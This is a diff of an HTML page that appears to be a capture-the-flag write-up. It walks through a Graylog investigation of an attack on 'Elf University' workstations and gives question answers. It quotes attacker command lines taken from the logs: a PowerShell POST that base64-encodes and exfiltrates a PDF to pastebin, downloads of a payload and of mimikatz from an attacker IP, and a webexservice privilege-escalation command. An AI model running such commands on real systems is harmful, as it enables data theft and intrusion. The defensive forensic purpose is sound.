+<a class=header-link href=#alabaster-snowball---nyancat-shell><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Inside the shell</p><pre tabindex=0><code>nyancat, nyancat
 I love that nyancat!
 My shell&#39;s stuffed inside one
 Whatcha&#39; think about that?
@@ -835,8 +765,7 @@ Loading, please wait......
 
 You did it! Congratulations!
 </code></pre><h1 id=2-letter>2. Letter
-<a class=header-link href=#2-letter><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h1><p>Answer: <code>DEMAND</code>.</p><pre tabindex=0><code>Date: February 28, 2019
+<a class=header-link href=#2-letter><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Answer: <code>DEMAND</code>.</p><pre tabindex=0><code>Date: February 28, 2019
 
 To the Administration, Faculty, and Staff of Elf University
 17 Christmas Tree Lane
@@ -865,16 +794,10 @@ Sincerely,
 
 --A Concerned and Aggrieved Character
 </code></pre><p>Is there anything in this letter?</p><p>Answer to question 2: <code>DEMAND</code></p><h1 id=tangle-coalbox---frosty-keypad>Tangle Coalbox - Frosty Keypad
-<a class=header-link href=#tangle-coalbox---frosty-keypad><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h1><p><code>7331</code> is prime.</p><h1 id=pepper-minstix---graylog>Pepper Minstix - Graylog
-<a class=header-link href=#pepper-minstix---graylog><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h1><p>Actual page that can be opened in the browser:</p><ul>
-<li><a href=https://graylog.elfu.org/ target=_blank rel="noreferrer noopener">https://graylog.elfu.org/</a></li></ul><h2 id=questions>Questions
-<a class=header-link href=#questions><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h2><h3 id=question-1>Question 1
-<a class=header-link href=#question-1><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h3><p>What is the full-path + filename of the first malicious file downloaded by Minty?</p><ul>
-<li>Answer <code>C:\Users\minty\Downloads\cookie_recipe.exe</code></li></ul><p>Search for <code>recipe</code> and one message pops up.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>CommandLine
+<a class=header-link href=#tangle-coalbox---frosty-keypad><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p><code>7331</code> is prime.</p><h1 id=pepper-minstix---graylog>Pepper Minstix - Graylog
+<a class=header-link href=#pepper-minstix---graylog><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Actual page that can be opened in the browser:</p><ul><li><a href=https://graylog.elfu.org/ target=_blank rel="noreferrer noopener">https://graylog.elfu.org/</a></li></ul><h2 id=questions>Questions
+<a class=header-link href=#questions><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><h3 id=question-1>Question 1
+<a class=header-link href=#question-1><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>What is the full-path + filename of the first malicious file downloaded by Minty?</p><ul><li>Answer <code>C:\Users\minty\Downloads\cookie_recipe.exe</code></li></ul><p>Search for <code>recipe</code> and one message pops up.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>CommandLine
 </span></span><span style=display:flex><span>C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe <span style=color:#b58900>Invoke-WebRequest</span> -Uri
 </span></span><span style=display:flex><span>https://pastebin.com/post.php -Method POST -Body @{ <span style=color:#2aa198>&#34;submit_hidden&#34;</span> =
 </span></span><span style=display:flex><span><span style=color:#2aa198>&#34;submit_hidden&#34;</span>; <span style=color:#2aa198>&#34;paste_code&#34;</span> =
@@ -883,14 +806,11 @@ Sincerely,
 </span></span><span style=display:flex><span><span style=color:#2aa198>&#34;paste_name&#34;</span>=<span style=color:#2aa198>&#34;cookie recipe&#34;</span> }
 </span></span></code></pre></div><p><code>C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf</code></p><p>This is for alabaster and not what we want.</p><p>Searching for <code>minty</code> brings up a lot of results but if we search for it in the
 results in the browser with <code>ctrl+f</code> we can see the downloaded file:</p><p><code>C:\Users\minty\Downloads\cookie_recipe.exe</code></p><h3 id=question-2>Question 2
-<a class=header-link href=#question-2><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h3><p>The malicious file downloaded and executed by Minty gave the attacker remote
+<a class=header-link href=#question-2><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>The malicious file downloaded and executed by Minty gave the attacker remote
 access to his machine. What was the ip:port the malicious file connected to
-first?</p><ul>
-<li>Answer <code>192.168.247.175:4444</code></li></ul><p>Searching for <code>cookie_recipe.exe</code> we can then click on <code>EventID</code> to the left and
+first?</p><ul><li>Answer <code>192.168.247.175:4444</code></li></ul><p>Searching for <code>cookie_recipe.exe</code> we can then click on <code>EventID</code> to the left and
 then click on <code>Quick Values</code> to bring up a chart. Then we can click on the
-magnifying glass beside each value to filter by that event ID.</p><ul>
-<li><code>cookie_recipe.exe AND EventID:2</code> is when Firefox created the downloaded file.</li><li><code>cookie_recipe.exe AND EventID:3</code> is what we want.</li></ul><pre tabindex=0><code>message
+magnifying glass beside each value to filter by that event ID.</p><ul><li><code>cookie_recipe.exe AND EventID:2</code> is when Firefox created the downloaded file.</li><li><code>cookie_recipe.exe AND EventID:3</code> is what we want.</li></ul><pre tabindex=0><code>message
 
 elfu-res-wks1 MSWinEventLog 1   Microsoft-Windows-Sysmon/Operational    2441
 Tue Nov 19 05:24:04 2019    3   Microsoft-Windows-Sysmon    SYSTEM  User
@@ -903,53 +823,38 @@ SourceHostname: elfu-res-wks1.localdomain  SourcePort: 53564  SourcePortName:
 DestinationIsIpv6: false  DestinationIp: 192.168.247.175  DestinationHostname:
 DEFANELF  DestinationPort: 4444  DestinationPortName:    20132
 </code></pre><p><code>192.168.247.175:4444</code></p><h3 id=question-3>Question 3
-<a class=header-link href=#question-3><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h3><p>What was the first command executed by the attacker?</p><ul>
-<li>(answer is a single word) <code>whoami</code></li></ul><p>Searching for <code>cookie_recipe</code> and looking at timestamps, the first action after
+<a class=header-link href=#question-3><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>What was the first command executed by the attacker?</p><ul><li>(answer is a single word) <code>whoami</code></li></ul><p>Searching for <code>cookie_recipe</code> and looking at timestamps, the first action after
 <code>Tue Nov 19 05:24:04 2019</code> that we saw above is <code>C:\Windows\system32\cmd.exe /c "whoami "</code></p><h3 id=question-4>Question 4
-<a class=header-link href=#question-4><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h3><p>What is the one-word service name the attacker used to escalate privileges?</p><ul>
-<li>Answer <code>webexservice</code></li></ul><pre tabindex=0><code>C:\Windows\system32\cmd.exe /c &#34;Invoke-WebRequest -Uri
+<a class=header-link href=#question-4><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>What is the one-word service name the attacker used to escalate privileges?</p><ul><li>Answer <code>webexservice</code></li></ul><pre tabindex=0><code>C:\Windows\system32\cmd.exe /c &#34;Invoke-WebRequest -Uri
     http://192.168.247.175/cookie_recipe2.exe -OutFile cookie_recipe2.exe &#34;
 
 C:\Windows\system32\cmd.exe /c &#34;sc start webexservice a software-update 1 
 wmic process call create &#34;cmd.exe /c C:\Users\minty\Downloads\cookie_recipe2.exe&#34; &#34;
 </code></pre><h3 id=question-5>Question 5
-<a class=header-link href=#question-5><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h3><p>What is the file-path + filename of the binary ran by the attacker to dump
-credentials?</p><ul>
-<li>Answer <code>C:\cookie.exe</code></li></ul><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>C:\Windows\system32\cmd.exe /c <span style=color:#2aa198>&#34;Invoke-WebRequest -Uri
+<a class=header-link href=#question-5><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>What is the file-path + filename of the binary ran by the attacker to dump
+credentials?</p><ul><li>Answer <code>C:\cookie.exe</code></li></ul><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>C:\Windows\system32\cmd.exe /c <span style=color:#2aa198>&#34;Invoke-WebRequest -Uri
 </span></span></span><span style=display:flex><span><span style=color:#2aa198>https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20190813/mimikatz_trunk.zip
 </span></span></span><span style=display:flex><span><span style=color:#2aa198>-OutFile cookie.zip &#34;</span>
 </span></span></code></pre></div><p>Searching for <code>mimikatz</code> we find another event. It says the original filename of
 <code>cookie.exe</code> was <code>mimikatz</code>. It was renamed.</p><p><code>C:\Windows\system32\cmd.exe /c "Invoke-WebRequest -Uri http://192.168.247.175/mimikatz.exe -OutFile C:\cookie.exe "</code></p><h3 id=question-6>Question 6
-<a class=header-link href=#question-6><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h3><p>The attacker pivoted to another workstation using credentials gained from
-Minty's computer. Which account name was used to pivot to another machine?</p><ul>
-<li>Answer <code>alabaster</code></li></ul><p><a href=https://www.jpcert.or.jp/english/pub/sr/20170612ac-ir_research_en.pdf target=_blank rel="noreferrer noopener">https://www.jpcert.or.jp/english/pub/sr/20170612ac-ir_research_en.pdf</a></p><pre tabindex=0><code>event ID `4624`
+<a class=header-link href=#question-6><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>The attacker pivoted to another workstation using credentials gained from
+Minty's computer. Which account name was used to pivot to another machine?</p><ul><li>Answer <code>alabaster</code></li></ul><p><a href=https://www.jpcert.or.jp/english/pub/sr/20170612ac-ir_research_en.pdf target=_blank rel="noreferrer noopener">https://www.jpcert.or.jp/english/pub/sr/20170612ac-ir_research_en.pdf</a></p><pre tabindex=0><code>event ID `4624`
 LogonType: 10 == remote == RDP - Logon Type 10 – RemoteInteractive
 
 EventID:4624 AND LogonType:10
 </code></pre><p>There is only one event at <code>06:04:28</code>.</p><h3 id=question-7>Question 7
-<a class=header-link href=#question-7><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h3><p>What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to
-another machine?</p><ul>
-<li>Answer <code>06:04:28</code></li></ul><h3 id=question-8>Question 8
-<a class=header-link href=#question-8><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h3><p>The attacker navigates the file system of a third host using their Remote
+<a class=header-link href=#question-7><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to
+another machine?</p><ul><li>Answer <code>06:04:28</code></li></ul><h3 id=question-8>Question 8
+<a class=header-link href=#question-8><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>The attacker navigates the file system of a third host using their Remote
 Desktop Connection to the second host. What is the
 SourceHostName,DestinationHostname,LogonType of this connection? (submit in that
-order as csv)</p><ul>
-<li>Answer <code>ELFU-RES-WKS2,ELFU-RES-WKS3,3</code></li></ul><p>Our info:</p><ul>
-<li>Time: <code>2019-11-19 06:07:22.000</code></li><li>Filter: <code>SourceHostName:ELFU\-RES\-WKS2 AND DestinationHostname:elfu\-res\-wks3</code></li></ul><p>The attacker has GUI access to workstation 2 via RDP. They likely use this GUI
+order as csv)</p><ul><li>Answer <code>ELFU-RES-WKS2,ELFU-RES-WKS3,3</code></li></ul><p>Our info:</p><ul><li>Time: <code>2019-11-19 06:07:22.000</code></li><li>Filter: <code>SourceHostName:ELFU\-RES\-WKS2 AND DestinationHostname:elfu\-res\-wks3</code></li></ul><p>The attacker has GUI access to workstation 2 via RDP. They likely use this GUI
 connection to access the file system of workstation 3 using explorer.exe via
 UNC file paths (which is why we don't see any cmd.exe or powershell.exe process
 creates). However, we still see the successful network authentication for this
 with event id 4624 and logon type 3.</p><h3 id=question-9>Question 9
-<a class=header-link href=#question-9><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h3><p>What is the full-path + filename of the secret research document after being
-transferred from the third host to the second host?</p><ul>
-<li>Answer <code>C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf</code></li></ul><p>Our filter is: <code>ProcessImage:C\:\\Windows\\Explorer.EXE AND source:elfu\-res\-wks2</code></p><p>Sorting by date, only one event is after the logon timestamp above.</p><pre tabindex=0><code>CreationUtcTime
+<a class=header-link href=#question-9><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>What is the full-path + filename of the secret research document after being
+transferred from the third host to the second host?</p><ul><li>Answer <code>C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf</code></li></ul><p>Our filter is: <code>ProcessImage:C\:\\Windows\\Explorer.EXE AND source:elfu\-res\-wks2</code></p><p>Sorting by date, only one event is after the logon timestamp above.</p><pre tabindex=0><code>CreationUtcTime
     2019-11-19T14:07:50.000Z
 EventID
     2
@@ -962,10 +867,8 @@ TargetFilename
 WindowsLogType
 Microsoft-Windows-Sysmon/Operational
 </code></pre><h3 id=question-10>Question 10
-<a class=header-link href=#question-10><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h3><p>What is the IPv4 address (as found in logs) the secret research document was
-exfiltrated to?</p><ul>
-<li>Answer <code>104.22.3.84</code></li></ul><p>Searching for <code>super_secret_elfu_research.pdf</code> there are 3 events.</p><pre tabindex=0><code>2019-11-19 06:14:24.000
+<a class=header-link href=#question-10><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>What is the IPv4 address (as found in logs) the secret research document was
+exfiltrated to?</p><ul><li>Answer <code>104.22.3.84</code></li></ul><p>Searching for <code>super_secret_elfu_research.pdf</code> there are 3 events.</p><pre tabindex=0><code>2019-11-19 06:14:24.000
 
 C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest -Uri
 https://pastebin.com/post.php -Method POST -Body @{ &#34;submit_hidden&#34; =
@@ -973,8 +876,7 @@ https://pastebin.com/post.php -Method POST -Body @{ &#34;submit_hidden&#34; =
 $([Convert]::ToBase64String([IO.File]::ReadAllBytes(&#34;C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf&#34;)));
 &#34;paste_format&#34; = &#34;1&#34;; &#34;paste_expire_date&#34; = &#34;N&#34;; &#34;paste_private&#34; = &#34;0&#34;;
 &#34;paste_name&#34;=&#34;cookie recipe&#34; }
